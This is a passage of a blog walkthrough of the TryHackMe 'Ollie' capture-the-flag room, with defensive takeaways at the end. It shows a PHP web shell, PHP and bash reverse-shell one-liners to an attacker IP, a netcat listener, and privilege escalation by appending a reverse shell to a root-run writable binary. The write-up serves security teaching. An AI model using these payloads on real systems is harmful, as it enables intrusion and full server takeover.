crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-80b9-9138-eb6cf287c81a" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">&lt;?php system($_REQUEST[&#x27;cmd&#x27;]); ?&gt;</code></pre><ul id="2a57a944-c6ef-80c8-94eb-da303abd43e1" class="bulleted-list"><li style="list-style-type:disc"><code><strong>system()</strong></code> - Executes operating system commands on the server</li></ul><ul id="2a57a944-c6ef-806c-9007-fee35e4ce57f" class="bulleted-list"><li style="list-style-type:disc"><code><strong>$_REQUEST[&#x27;cmd&#x27;]</strong></code> - Takes input from GET, POST, or COOKIE parameters named &#x27;cmd&#x27;</li></ul><ul id="2a57a944-c6ef-80c3-9c28-db2ce7a9bd1d" class="bulleted-list"><li style="list-style-type:disc">Executes ANY command passed via the <code>cmd</code> parameter with the web server&#x27;s privileges</li></ul><p id="2a57a944-c6ef-804d-97c9-e1e65b93f0d2" class="">
+</p><p id="2a57a944-c6ef-8035-ac3d-dfee1b9cee00" class="">Here you can see I list the file content in the web directory using ls command</p><p id="2a57a944-c6ef-80dc-928c-d3a1cafe68ea" class="">
+</p><figure id="2a57a944-c6ef-802c-a16a-da136361ae2b" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%204.png"><img style="width:710px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%204.png"/></a></figure><p id="2a57a944-c6ef-80c0-aa7b-f6cd5c3b1041" class="">
+</p><p id="2a57a944-c6ef-80d4-aa1e-f9d0afcade69" class="">Now we can give it a reverse shell instead of normal commands</p><p id="2a57a944-c6ef-805f-994e-e438b95d2404" class="">
+</p><p id="2a57a944-c6ef-8014-8418-fe2ffaeccd65" class="">I used PHP exec reverse shell onliner  - change your ip and port btw</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-8042-bfb2-f6c9159eb338" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">php -r &#x27;$sock=fsockopen(&quot;10.21.89.255&quot;,4444);exec(&quot;bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;
+
+URL Encoded
+
+php%20-r%20%27%24sock%3Dfsockopen(%2210.21.89.255%22%2C4444)%3Bexec(%22bash%20%3C%263%20%3E%263%202%3E%263%22)%3B%27</code></pre><p id="2a57a944-c6ef-804f-b251-face57039950" class="">Before sending that url encoded revshell oneliner in the cmd= parameter you should start listener on your attacking machine: I used netcat as you guessed 😉. And one additional thing,  if you have firewall running, disable it temporarily for the connection to be successful.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-80f7-b0ab-c0035f2562d0" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">nc -lvnp 4444</code></pre><p id="2a57a944-c6ef-8097-8f4c-d9c229ae0d39" class="">send the payload and you can see the reverse shell connection back on your machine</p><p id="2a57a944-c6ef-80b5-89b2-e3ca6afe0e2f" class="">
+</p><figure id="2a57a944-c6ef-80db-aa5e-ffc5222810fb" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%205.png"><img style="width:864px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%205.png"/></a></figure><p id="2a57a944-c6ef-8080-b1e8-f504b328cdc7" class="">As you can see the initial shell was not  interactive -</p><p id="2a57a944-c6ef-80a2-a650-d96024cb5149" class="">
+</p><p id="2a57a944-c6ef-807e-9e18-f275365eb8e4" class="">whoami returned us → the web user <strong>www-data</strong></p><p id="2a57a944-c6ef-808e-86b7-cf0cf2347c86" class="">
+</p><p id="2a57a944-c6ef-804b-b393-d19be9339553" class="">I used python to get more interactive shell, set the HOME variable to /home and set the TERM variable to xterm to tells the system “this terminal should behaves like an X terminal” which is better option</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-801f-89f5-eb32014c9d36" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">python3 -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;
+export HOME=/home
+export TERM=xterm
+</code></pre><p id="2a57a944-c6ef-8000-8432-c9654f0d09cf" class="">I navigated to the home directory, there are two users, the default user ubuntu and ollie, I tried to <strong>ls</strong> ollie’s home directory, there is a file named user.txt, I tried to cat it out, but it threw a permission denied error, we have to escalate our privileged to do that.</p><p id="2a67a944-c6ef-80d4-b25a-fd03882ba0d0" class="">
+</p><h3 id="2a67a944-c6ef-80a7-8d64-c7cb280cb836" class="">Escalating to ollie</h3><p id="2a67a944-c6ef-8083-a50f-cd215e015a36" class="">
+</p><p id="2a67a944-c6ef-80ad-8b09-cc68bb9bf202" class="">In this type of rooms the first thing I do is check for password reuse. Luckily Ollie is guilty of this one.  I first tried to check config file at /var/www/html - there are database creds, but they are not ollie’s user passwords. I tried the one we first got from port 1337 and it worked. Using “su ollie”, and supplying the password we became ollie.</p><p id="2a67a944-c6ef-8011-b2b4-d30663d37e72" class="">
+</p><figure id="2a67a944-c6ef-80c9-a4d5-eb410200d949" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%206.png"><img style="width:864px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%206.png"/></a></figure><p id="2a57a944-c6ef-809c-96e1-dbe7a9cc67d2" class="">
+</p><p id="2a57a944-c6ef-8072-a602-e93e8f661ba4" class="">No we can go and read the user.txt file,which is the first flag of the room.</p><p id="2a67a944-c6ef-80bd-87ba-d6072e639022" class="">
+</p><h3 id="2a67a944-c6ef-80e2-b3a1-f1f2564bf705" class="">Escalating to root</h3><p id="2a67a944-c6ef-8091-a54a-ea957b06ead1" class="">
+</p><p id="2a67a944-c6ef-8099-9ef6-c23928d23f71" class="">Now, we need to enumerate the system, and see if we can find something useful. I tried some of the methods:</p><ul id="2a67a944-c6ef-80cd-b034-d11c4ab7d896" class="bulleted-list"><li style="list-style-type:disc">Credential-based escalation (password reuse, exposed keys) — backups, ssh keys</li></ul><ul id="2a67a944-c6ef-8060-b8ba-cbee81b24dd4" class="bulleted-list"><li style="list-style-type:disc">Sudo and account misconfiguration (overly-broad sudoers, NOPASSWD, weak ACLs)</li></ul><ul id="2a67a944-c6ef-80e9-8dd0-e44d19ef57ce" class="bulleted-list"><li style="list-style-type:disc">SUID binaries, file permissions, and capabilities (setuid root binaries, world-writable files, Linux capabilities)</li></ul><ul id="2a67a944-c6ef-806a-b177-d8db18ddb9ba" class="bulleted-list"><li style="list-style-type:disc">Service/process misconfigurations and daemon hijacking (insecure service configs, PATH/env injection, cron jobs)  - I got lucky on this one.</li></ul><ul id="2a67a944-c6ef-80df-9eb4-ed2d4718a3d3" class="bulleted-list"><li style="list-style-type:disc">Kernel/local exploit / module abuse / container escape</li></ul><p id="2a67a944-c6ef-80ea-ac85-ec2da6a0299d" class="">
+</p><p id="2a67a944-c6ef-809a-a5df-ff10ce91ec0c" class="">I used a tool named <strong>pspy</strong> to enumerate the processes running. pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea. You can get it from github  <a href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file">https://github.com/DominicBreuker/pspy?tab=readme-ov-file</a>  download it to your attacker machine.</p><p id="2a67a944-c6ef-802b-a8b4-ec396c4d851f" class="">
+</p><p id="2a67a944-c6ef-8064-8d79-d5a00ba17b04" class="">I started a python server using python3 -m http.server 8080,  On the target I used wget <a href="http://my-ip:8080/pspy64">http://my-ip:8080/pspy64</a> which downloads it there. Add executable permission </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a67a944-c6ef-8068-90ec-c965d8b6fee4" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">chmod +x pspy64 
+#run it
+./pspy</code></pre><p id="2a67a944-c6ef-800e-b990-e62cb649919f" class="">Few moments later I saw a process with a weird name (feedme), It is running with root privileges (UID=0). This process wasn’t running when I first ran pspy, it took sometime to come up, leading me to guess it was a cronjob or that it was running on a timer.</p><p id="2a67a944-c6ef-8016-8af6-d43107df6b03" class="">I searched for its binary using find command → find / -iname “*feedme*” 2&gt;/dev/null</p><p id="2a67a944-c6ef-8097-ae22-d3b3968ac23b" class="">
+</p><figure id="2a67a944-c6ef-802c-a627-f2ff231ffb32" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%207.png"><img style="width:768px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%207.png"/></a></figure><p id="2a67a944-c6ef-8037-95a8-e32552edbff1" class="">
+</p><p id="2a67a944-c6ef-8090-97dd-c34329c1130b" class="">The file has no content in it,  ls -l command gave us the file is writable by ollie, interesting right?</p><p id="2a67a944-c6ef-80f6-a161-c25040690d4d" class="">From here, we can think what if we write a revshell and listen in our machine, if sucessful we can get root shell because the binary was running with root privilege, that is what I did</p><p id="2a67a944-c6ef-808e-a35a-dc5b30bcf4b5" class="">
+</p><p id="2a67a944-c6ef-8013-8afe-df64fe0ea7f9" class="">let’s echo the a simple bash reverse shell.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a67a944-c6ef-80f9-aa8b-f0f203cf89d6" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">echo &quot;bash -i &gt;&amp; /dev/tcp/10.21.89.255/5555 0&gt;&amp;1&quot; &gt;&gt; /usr/bin/feedme</code></pre><p id="2a67a944-c6ef-80a0-b9c1-e861010ef2c4" class="">And start a listener on the same port:  nc -lvnp 5555</p><p id="2a67a944-c6ef-809f-98c3-d01ce835af63" class="">
+</p><figure id="2a67a944-c6ef-80dd-8bcc-dba220e249c8" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%208.png"><img style="width:709.9500122070312px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%208.png"/></a></figure><h3 id="2a67a944-c6ef-809e-a436-e4b50416074f" class="">Boom!  There we go!!!  we are now root</h3><p id="2a67a944-c6ef-80da-9a70-cfa380a65ac8" class="">
+</p><p id="2a67a944-c6ef-80ff-956d-cd57bbcbd501" class="">We can read the flag from root’s home directory</p><p id="2a67a944-c6ef-8093-bbfe-ef8811f7cb10" class="">
+</p><figure id="2a67a944-c6ef-80d5-a9a0-cc3d84b7100d" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%209.png"><img style="width:720px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%209.png"/></a></figure><p id="2a67a944-c6ef-8057-b134-c08bf59549ff" class="">
+</p><p id="2a67a944-c6ef-80c8-a106-e3a5d0431347" class="">
+</p><p id="2a67a944-c6ef-8084-9008-e516bbddc277" class="">
+</p><p id="2a67a944-c6ef-80d5-add5-d8e829506630" class="">
+</p><p id="2a67a944-c6ef-80a0-86fc-fcb352b1a805" class=""><strong>Conclusion and Takeaways</strong></p><p id="2a67a944-c6ef-8004-a7de-e8d65db64278" class="">This CTF was both engaging and educational, reinforcing several key security concepts that apply beyond the lab.</p><p id="2a67a944-c6ef-80a8-a217-f0023bb94081" class="">First, always understand the vulnerabilities that could exist in your exposed services. The phpIPAM instance in this challenge demonstrated the risk of running unprotected applications online — in this case, one vulnerable to SQL injection. Such services should be isolated or protected with measures like a Web Application Firewall (WAF) to block malicious input.</p><p id="2a67a944-c6ef-8085-84de-ed122f6ca593" class="">Second, never reuse passwords across systems. The same credentials that granted access to phpIPAM also worked for Ollie’s user account. While convenient, password reuse gives attackers an easy path to move laterally once a single set of credentials is compromised. Use unique, strong passwords everywhere.</p><p id="2a67a944-c6ef-80cc-bcdc-e38195ab679f" class="">Finally, control and monitor privileged executables carefully. The <code>feedme</code> binary, which executed with root privileges, allowed write access by non-admin users — a clear privilege escalation risk. Any binary or process running with elevated permissions must be secured against modification and tightly audited.</p><p id="2a67a944-c6ef-809f-b430-cc573c514c7c" class="">In short: patch and protect your exposed services, enforce unique credentials, and restrict access to privileged components. Each of these steps can prevent attackers from turning small misconfigurations into full compromises.</p><p id="2a67a944-c6ef-805c-ac49-c42465048308" class="">
+</p><p id="2a67a944-c6ef-8021-9386-f22d58694bd5" class="">Thanks for reading — I hope this write-up was informative and encourages you to apply these lessons in your own security practice.</p><p id="2a67a944-c6ef-8008-bda3-f09bdea7ea75" class="">
+</p><p id="2a67a944-c6ef-8095-8aea-dfd0da2fcda9" class="">Feel free to share this post and other posts from my blog if you think others would also like it. Thank you!</p><p id="2a67a944-c6ef-80f2-b0f0-de2eeb449479" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
